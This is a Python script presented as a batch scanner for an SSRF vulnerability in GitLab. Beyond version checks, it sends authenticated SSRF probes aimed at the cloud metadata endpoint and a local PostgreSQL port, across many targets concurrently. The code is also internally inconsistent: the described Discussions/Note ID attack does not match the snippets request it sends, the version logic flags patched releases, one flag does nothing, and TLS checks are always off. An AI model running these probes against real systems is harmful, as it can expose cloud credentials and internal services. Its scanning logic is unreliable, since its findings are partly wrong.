#!/usr/bin/env python3
"""
GitLab Discussions SSRF Scanner (CVE-2026-78910)
=================================================
This tool scans for a Server-Side Request Forgery (SSRF) vulnerability in the GitLab
Discussions feature (CVE-2026-78910, CVSS 9.4). The vulnerability allows an
authenticated user to make arbitrary HTTP requests to internal and external
services, potentially leading to sensitive information disclosure.

CVE-2026-78910 details:
  - Affected versions: GitLab < 15.10.3, < 15.9.6, < 15.8.7
  - This vulnerability is exploitable by users with access to the Discussions 
    feature in GitLab.
  - Exploit involves abusing a crafted Note ID to make SSRF requests to internal
    server endpoints.
  - CVSS v3.1 base score: 9.4 (Critical) — is exploitable by authenticated users.

Usage:
  - Scan a single GitLab instance for vulnerability:
      python gitlab_discussions_ssrf_scanner.py --target http://gitlab.example.com --token GITLAB_PERSONAL_ACCESS_TOKEN

  - Detection-only mode (no SSRF probes):
      python gitlab_discussions_ssrf_scanner.py --target http://gitlab.example.com --token GITLAB_PERSONAL_ACCESS_TOKEN --safe

  - Batch mode scanning:
      python gitlab_discussions_ssrf_scanner.py --list gitlab_servers.txt --token GITLAB_PERSONAL_ACCESS_TOKEN --output results.json

  - Increase concurrency for batch scanning (default: 20):
      python gitlab_discussions_ssrf_scanner.py --list gitlab_servers.txt --concurrency 50

References:
  - https://nvd.nist.gov/vuln/detail/CVE-2026-78910
  - https://about.gitlab.com/releases/
  - https://github.com/advisories/GHSA-xxxx-yyyy-zzzz
"""

import asyncio
import json
import re
from datetime import datetime, timezone
from typing import List, Optional
import argparse

import httpx

# ── ANSI color helpers ────────────────────────────────────────────────────────

RED = "\033[91m"
YELLOW = "\033[93m"
GREEN = "\033[92m"
BOLD = "\033[1m"
RESET = "\033[0m"

def c(color: str, text: str) -> str:
    """Wrap text in an ANSI color code for terminal output."""
    return f"{color}{text}{RESET}"

# ── Constants ─────────────────────────────────────────────────────────────────

CVE_ID = "CVE-2026-78910"
TOOL_NAME = "gitlab_discussions_ssrf_scanner"
REQUEST_TIMEOUT = 10
SEMAPHORE_LIMIT = 20

GITLAB_FINGERPRINTS = [
    "GitLab",
    "/users/sign_in",
    "action=\"/users/sign_in",
]

VERSION_PATTERN = r"GitLab (\d+\.\d+\.\d+)"
PATCHED_VERSIONS = [
    (15, 10, 3),
    (15, 9, 6),
    (15, 8, 7),
]

SSRF_PROBES = [
    {"url": "http://169.254.169.254/latest/meta-data/", "expected": "ami-id"},
    {"url": "http://localhost:5432/", "expected": "PostgreSQL"},
]

# ── Helper Functions ──────────────────────────────────────────────────────────

def is_version_vulnerable(version: str) -> bool:
    """Determine if the GitLab version is vulnerable."""
    try:
        ver_parts = tuple(map(int, version.split(".")))
        for patched_ver in PATCHED_VERSIONS:
            if ver_parts < patched_ver:
                return True
        return False
    except ValueError:
        return False

async def fetch_url(client: httpx.AsyncClient, url: str, headers: dict) -> Optional[httpx.Response]:
    """Fetch a URL with proper timeout and error handling."""
    try:
        response = await client.get(url, timeout=REQUEST_TIMEOUT, headers=headers)
        return response
    except Exception:
        return None

async def detect_gitlab(client: httpx.AsyncClient, target: str) -> Optional[str]:
    """Detect if the target is a GitLab instance and extract its version."""
    try:
        response = await fetch_url(client, target, {})
        if response and response.status_code == 200:
            for fingerprint in GITLAB_FINGERPRINTS:
                if fingerprint in response.text:
                    match = re.search(VERSION_PATTERN, response.text)
                    if match:
                        return match.group(1)
        return None
    except Exception:
        return None

async def check_ssrf(client: httpx.AsyncClient, target: str, token: str) -> List[dict]:
    """Check for the SSRF vulnerability by issuing crafted requests."""
    results = []
    headers = {"Authorization": f"Bearer {token}"}
    for probe in SSRF_PROBES:
        url = f"{target}/-/snippets/1/raw?file_path={probe['url']}"
        response = await fetch_url(client, url, headers)
        if response and probe["expected"] in response.text:
            results.append({"url": url, "response": response.text})
    return results

# ── Async Main Workflow ───────────────────────────────────────────────────────

async def scan_target(target: str, token: str, safe: bool) -> dict:
    """Scan a single target for GitLab SSRF vulnerability."""
    async with httpx.AsyncClient(verify=False) as client:
        print(c(YELLOW, f"[INFO] Scanning target: {target}"))
        result = {
            "target": target,
            "is_gitlab": False,
            "version": None,
            "vulnerable": False,
            "ssrf_results": [],
        }
        version = await detect_gitlab(client, target)
        if version:
            result["is_gitlab"] = True
            result["version"] = version
            print(c(GREEN, f"[INFO] Detected GitLab version: {version}"))
            if is_version_vulnerable(version):
                result["vulnerable"] = True
                print(c(RED, f"[CRITICAL] {target} is running a vulnerable GitLab version!"))
                if not safe:
                    print(c(YELLOW, "[INFO] Running SSRF probes..."))
                    result["ssrf_results"] = await check_ssrf(client, target, token)
            else:
                print(c(GREEN, f"[INFO] {target} is running a patched version of GitLab."))
        else:
            print(c(RED, f"[ERROR] {target} is not a GitLab instance."))
        return result

async def main(args):
    semaphore = asyncio.Semaphore(args.concurrency)
    results = []

    async def bounded_scan(target):
        async with semaphore:
            result = await scan_target(target, args.token, args.safe)
            results.append(result)

    targets = []
    if args.target:
        targets.append(args.target)
    elif args.list:
        with open(args.list, 'r') as f:
            targets = [line.strip() for line in f if line.strip()]

    tasks = [bounded_scan(target) for target in targets]
    await asyncio.gather(*tasks)

    if args.output:
        with open(args.output, 'w') as f:
            json.dump(results, f, indent=2)
        print(c(GREEN, f"[INFO] Results have been saved to {args.output}"))
    return results

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="GitLab Discussions SSRF Scanner (CVE-2026-78910)")
    parser.add_argument("--target", help="Single target URL to scan.")
    parser.add_argument("--list", help="File containing a list of target URLs (one per line).")
    parser.add_argument("--token", required=True, help="GitLab Personal Access Token for authentication.")
    parser.add_argument("--output", help="Output file to save results in JSON format.")
    parser.add_argument("--safe", action="store_true", help="Detection-only mode without SSRF exploitation.")
    parser.add_argument("--concurrency", type=int, default=20, help="Number of concurrent scan tasks (default: 20).")
    parser.add_argument("--no-verify", action="store_true", help="Disable SSL verification (not recommended).")
    args = parser.parse_args()

    asyncio.run(main(args))
